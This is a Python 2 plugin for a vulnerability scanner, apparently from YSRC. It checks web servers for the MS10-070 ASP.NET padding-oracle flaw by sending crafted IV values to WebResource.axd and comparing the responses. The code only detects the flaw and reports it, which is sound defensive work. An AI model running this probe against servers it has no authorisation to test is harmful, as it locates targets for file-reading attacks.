# coding=utf-8
import base64
import urllib2

def get_plugin_info():
    plugin_info = {
        "name": ".NET Padding Oracle信息泄露",
        "info": "攻击者通过此漏洞最终可以达到任意文件读取的效果。",
        "level": "高危",
        "type": "任意文件读取",
        "author": "wolf@YSRC",
        "url": "",
        "keyword": "tag:aspx",
        "source": 1
    }
    return plugin_info

def check(ip, port, timeout):
    try:
        url = 'http://' + ip + ":" + str(port)
        res_html = urllib2.urlopen(url, timeout=timeout).read()
        if 'WebResource.axd?d=' in res_html:
            error_i = 0
            bglen = 0
            for k in range(0, 255):
                IV = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + chr(k)
                bgstr = 'A' * 21 + '1'
                enstr = base64.b64encode(IV).replace('=', '').replace('/', '-').replace('+', '-')
                exp_url = "%s/WebResource.axd?d=%s" % (url, enstr + bgstr)
                try:
                    request = urllib2.Request(exp_url)
                    res = urllib2.urlopen(request, timeout=timeout)
                    res_html = res.read()
                    res_code = res.code
                except urllib2.HTTPError, e:
                    res_html = e.read()
                    res_code = e.code
                except urllib2.URLError, e:
                    error_i += 1
                    if error_i >= 3: return
                except:
                    return
                if int(res_code) == 200 or int(res_code) == 500:
                    if k == 0:
                        bgcode = int(res_code)
                        bglen = len(res_html)
                    else:
                        necode = int(res_code)
                        if (bgcode != necode) or (bglen != len(res_html)):
                            return u'MS10-070 ASP.NET Padding Oracle信息泄露漏洞'
                else:
                    return
    except Exception, e:
        pass
